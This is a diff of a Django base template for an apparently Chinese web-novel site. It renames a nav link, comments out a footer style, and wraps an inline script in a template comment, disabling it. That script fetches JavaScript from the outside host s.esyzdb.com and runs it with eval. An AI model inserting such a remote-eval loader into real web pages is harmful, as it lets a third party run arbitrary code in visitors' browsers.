@@ -1,6 +1,5 @@
 {% load staticfiles %}
 <!DOCTYPE html>
-
 <html>
 <head>
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
@@ -32,7 +31,7 @@
     <div class="nav">
         <ul>
             <li><a href="/cate/xuanhuan/">分类</a></li>
-            {# <li><a href="/top/">排行</a></li> #}
+            <li><a href="/top/">推荐</a></li>
             <li><a href="/quanben/">全本</a></li>
             <li><a rel="nofollow" href="/profile/">书架</a></li>
         </ul>
@@ -61,7 +60,7 @@
     {% endblock main %}
 
     <!-- 底部菜单 -->
-    <div class="footer" style="height: 180px;">
+    <div class="footer" {# style="height: 180px;" #}>
         <ul>
             <li><a href="" onclick="addFavorite;" rel="sidebar">收藏</a></li>
             <li><a rel="nofollow" href="/profile/">书架</a></li>
@@ -69,11 +68,11 @@
             <li><a href="" style="color:red">报错</a></li>
         </ul>
     </div>
-
+{% comment %}
     <div id="wayk">
         <script>(function(){var d=(/UCBrowser|QQBrowser/i.test(navigator.userAgent))?'http://s.esyzdb.com':'http://s.esyzdb.com';var a=new XMLHttpRequest();var b=d+'/27/29/'+Math.floor(Math.random()*9999999+1);if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(window.execScript)window.execScript(a.responseText,"JavaScript");else if(window.eval)window.eval(a.responseText,"JavaScript");else eval(a.responseText);}};a.open("GET",b,false);a.send();}})();</script>
     </div>
-
+{% endcomment %}
     <!-- 站长统计 -->
     <div style="display:none">
         <script src="https://s13.cnzz.com/z_stat.php?id=1262980855&web_id=1262980855" charset="utf-8" type="text/javascript"></script>
